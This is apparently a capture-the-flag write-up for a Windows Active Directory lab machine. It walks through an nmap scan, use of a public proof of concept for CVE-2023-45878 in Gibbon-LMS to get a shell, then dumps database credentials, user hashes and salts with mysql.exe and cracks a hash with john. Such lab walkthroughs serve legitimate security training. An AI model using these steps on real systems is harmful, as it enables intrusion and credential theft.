## Windows Medium

### Enumeration

```
Nmap Scan
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)

53/tcp   open  domain        Simple DNS Plus

80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-08 02:49:58Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)

445/tcp  open  microsoft-ds?

464/tcp  open  kpasswd5?

593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp  open  tcpwrapped

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)

3269/tcp open  tcpwrapped
```

### HTTP 80

Website running on http://frizzdc.frizz.htb

There is a Gibbon-LMS installed

Tried looking for exploits online

![image](https://github.com/user-attachments/assets/f3a0daac-8b82-4698-b539-560aba9d3d12)

This looks juicy, lets follow the rabbit hole

https://github.com/davidzzo23/CVE-2023-45878.git

Found a POC, lets try running the script

![image](https://github.com/user-attachments/assets/f3c814f8-b28e-4c75-9b7e-6853a7746d94)

Works, lets see if we can get a shell

BOOYAH

![image](https://github.com/user-attachments/assets/67697a21-50dd-4deb-8bb9-e8d357afe16a)

lets try to find credentials

Under Gibbon-LMS we find a config.php with db creds

$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

users

a.perlstein
Administrator
c.ramon
c.sandiego
d.hudson
f.frizzle
g.frizzle
Guest
h.arm
J.perlstein
k.franklin
krbtgt
l.awesome
m.ramon
M.SchoolBus
p.terese
r.tennelli
t.wright
v.frizzle
w.li
w.Webservice

lets figure out how to see mysql db for creds

We can run mysql.exe from the xampp folder

```
PS C:\xampp\mysql\bin> ./mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "use gibbon; select title,username,passwordStrong, passwordStrongSalt, gibbonRoleIDPrimary from gibbonperson"
```

found creds

pass- 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
salt- /aACFhikmNopqrRTVz2489

i was not sure how to crack this hash so i did some reading online, GibbonLMS uses SHA256 to hash the password
we can use dynamic_82 method to crack this hash, save the hash in a file as - 

f.frizzle:$dynamic_82$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489

and run john against rockyou wordlist and we get a password

![image](https://github.com/user-attachments/assets/1c114ae0-5f72-466b-8280-a1cc522c6d66)

